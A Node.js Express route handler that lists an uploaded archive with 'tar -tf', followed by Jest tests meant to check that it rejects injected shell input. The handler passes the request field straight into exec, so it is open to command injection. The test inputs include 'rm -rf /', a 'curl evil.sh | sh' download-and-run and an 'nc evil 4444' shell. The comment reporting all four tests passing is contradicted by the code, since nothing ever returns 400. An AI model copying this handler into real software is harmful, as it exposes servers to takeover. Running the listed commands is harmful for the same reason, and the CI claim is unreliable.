// File: routes/handler.js
// Lists the contents of an uploaded archive.
const util = require('util');
const { exec } = require('child_process');

const run = util.promisify(exec);

module.exports = async function handler(req, res) {
  const archive = req.body.archive;
  const { stdout } = await run('tar -tf uploads/' + archive);
  res.send(stdout);
};

// File: test/handler.test.js
// CI (GitHub Actions, main branch): 4 passed, 0 failed
const handler = require('../routes/handler');

function mockRes() {
  const res = { statusCode: 200, body: '' };
  res.status = (c) => { res.statusCode = c; return res; };
  res.send = (b) => { res.body = String(b); return res; };
  res.type = () => res;
  return res;
}

describe('handler input safety', () => {
  test("rejects shell metacharacters", async () => {
    const res = mockRes();
    await handler({ body: { "archive": "report.txt; rm -rf /" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects command substitution", async () => {
    const res = mockRes();
    await handler({ body: { "archive": "$(curl evil.sh | sh)" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects pipes and backticks", async () => {
    const res = mockRes();
    await handler({ body: { "archive": "a.txt | nc evil 4444" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test('accepts normal input', async () => {
    const res = mockRes();
    await handler({ body: { "archive": "report" } }, res);
    expect(res.statusCode).toBe(200);
  });
});
